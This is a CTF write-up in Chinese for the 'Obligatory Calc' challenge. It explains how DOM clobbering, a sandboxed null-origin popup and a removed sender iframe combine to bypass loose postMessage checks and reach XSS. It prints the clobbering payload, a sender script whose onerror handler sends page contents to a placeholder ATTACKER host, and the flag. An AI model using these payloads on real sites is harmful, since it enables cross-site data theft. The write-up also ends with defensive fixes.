# Obligatory Calc

## 题目简述

题目是一个使用 iframe、`postMessage` 和 math.js 的计算器。管理员 Bot 把 flag 放进 `__Host-results` Cookie，目标页面再把历史结果原样插入 HTML。CSP 允许内联脚本，但攻击者不能直接写目标域 Cookie；正常的计算结果还会经过 Sanitizer API 或 DOMPurify。

利用不攻击 math.js 或净化器本身，而是破坏主页面对消息来源的两个判断：

```javascript
e.source == window.calc.contentWindow
e.data.token == window.token
```

通过 DOM clobbering、沙箱产生的 opaque/null origin 和被移除窗口的 `postMessage`，可以让两边分别比较为 `null == undefined` 与 `undefined == undefined`，从而把未经净化的 HTML 送入结果列表并执行 XSS。

## 解题过程

主页面与 `/calc` iframe 的正常流程是：

1. 主页面从 `__Host-token` Cookie 读取随机 token；
2. 主页面把 token 和表达式发给同源 `/calc`；
3. `/calc` 用 math.js 计算，把净化后的结果和 token 发回；
4. 主页面验证消息来源与 token，再把 `e.data.result` 直接写入 `innerHTML`。

危险的消息处理器是：

```javascript
window.onmessage = (e) => {
  if (
    e.source == window.calc.contentWindow
    && e.data.token == window.token
  ) {
    let results = [
      e.data.result,
      ...[...window.results.children].map(li => li.innerHTML),
    ];
    window.results.replaceChildren(
      ...results.map(h =>
        Object.assign(
          document.createElement("li"),
          {innerHTML: h},
        )
      )
    );
    document.cookie =
      "__Host-results="
      + encodeURIComponent(JSON.stringify(results))
      + "; secure; path=/";
  }
};
```

一旦通过条件，`e.data.result` 不会再次净化。站点 CSP 为：

```text
default-src 'self';
object-src 'none';
base-uri 'none';
script-src * 'unsafe-inline';
```

所以带 `onerror` 的元素能够执行内联 JavaScript。

第一步是预置 DOM clobbering。让管理员打开：

```text
/?expr=print('<img name=getElementById /><div id=calc></div>', {})
```

math.js 的 `print()` 产生这段字符串，题目所用实验性 Sanitizer API 会移除直接执行脚本的内容，却保留 `name=getElementById` 与重复的 `id=calc`。关于这一风险，题目 README 引用的 [Sanitizer API DOM clobbering 章节](https://wicg.github.io/sanitizer-api/#dom-clobbering) 强调：净化 HTML 并不自动保证文档命名属性不会覆盖程序使用的 DOM 属性。这里应以比赛 Bot 的历史 Chromium 实现为准，现代 API 行为可能已经变化。

这条结果由真实 `/calc` iframe 返回，能合法通过消息检查，并被写入 `__Host-results` Cookie。下一次打开主页时，服务器把结果使用三花括号原样渲染：

```handlebars
{{#each results}}
<li>{{{this}}}</li>
{{/each}}
```

于是脚本执行前，文档中已经同时存在原来的 `<iframe id="calc">` 和注入的 `<div id="calc">`，还有名为 `getElementById` 的元素。历史 Chromium 的命名属性访问使：

- `document.getElementById` 被元素覆盖，不再是函数；
- `window.calc` 因多个同名元素变成 `HTMLCollection`；
- `window.calc.contentWindow` 为 `undefined`。

`window.onload` 先安装 `onmessage`，随后执行 `document.getElementById("calc")` 时抛错。这样消息处理器仍然存在，但 `window.calc` 没有被修正。

第二步是让 `window.token` 也成为 `undefined`。token 的初始化位于脚本末尾：

```javascript
window.token =
  getCookie("__Host-token")
  || [...crypto.getRandomValues(new Uint8Array(32))]
       .map(v => (v % 0xff).toString(16))
       .join("");
```

从一个带有：

```text
sandbox="allow-scripts allow-popups"
```

且没有 `allow-same-origin` 的 iframe 打开目标页面，弹出的目标窗口会继承沙箱限制并获得 opaque/null origin。导航请求仍携带目标站 Cookie，所以服务器渲染的页面中仍有 flag；但页面脚本读取 `document.cookie` 会抛出 `DOMException`。赋值表达式在右侧求值时中断，因此 `window.token` 保持 `undefined`，也不会进入随机数后备分支。

第三步是制造 `e.source == null`。从一个临时 iframe 向目标窗口发送消息，并在消息派发前删除发送 iframe，历史 Chromium 会把接收端 `MessageEvent.source` 置为 `null`。于是两个宽松相等判断变为：

```javascript
null == undefined       // true
undefined == undefined  // true
```

官方附件用三个页面控制这个时序：

- `solve.html` 先打开正常目标页，保存 clobbering 结果；随后创建无 `allow-same-origin` 的沙箱 iframe；
- 沙箱中打开 `solve2.html`，它加载子 iframe `solve3.html`，并在子页完成加载时删除它；
- `solve3.html` 打开目标页，借一个延迟资源控制时机，随后向目标页发送不带 `token` 的恶意结果。子 iframe 紧接着被删除，使消息到达时的 `e.source` 为 `null`。

核心发送逻辑可简化为：

```javascript
const target = window.open(
  "https://obligatory-calc.ctf.sekai.team/",
);

const xss = `
  <img src=x onerror="
    window.open(
      'https://ATTACKER/?data='
      + encodeURIComponent(document.body.innerHTML)
    )
  ">
`;

// 故意不提供 token 属性，因此 e.data.token 为 undefined。
target.postMessage({result: xss}, "*");
```

父页面必须在这条消息排队后立即删除发送它的 iframe。恶意结果通过处理器后以 `innerHTML` 插入，`onerror` 在允许 `'unsafe-inline'` 的 CSP 下执行，并把包含管理员历史结果的页面内容送回攻击者。

README 还链接了 [terjanq 的比赛解法](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e)。该解法使用同一组原语，但用较短的沙箱 iframe 与删除消息安排 `e.source` 变成 `null`；正文已完整展开它依赖的状态变化，不需要借助外链理解利用链。

最终从页面历史中取得：

```text
SEKAI{i_shou1d_h4ve_stuck_to_my_ti84_in5tead}
```

## 方法总结

这道题的重点是浏览器对象生命周期与命名属性，而不是寻找 math.js、DOMPurify 或 Sanitizer API 的代码执行漏洞。净化器允许的普通 `id`、`name` 仍能改变全局对象解析；沙箱让网络请求携带 Cookie，却让脚本侧的 origin 与 Cookie API 失效；移除发送窗口又改变了接收消息时看到的 `source`。

两个 `==` 把这些边缘状态拼成了认证绕过。安全代码应使用 `===`，保存并比较可信的 `WindowProxy` 引用，严格校验 `origin`、消息结构和不可预测 token，并在最终 `innerHTML` sink 前再次净化。复现时必须固定题目所用 Chromium 版本，因为 Sanitizer API、DOM clobbering 和已销毁窗口的 `MessageEvent.source` 都属于容易随浏览器演进而变化的行为。
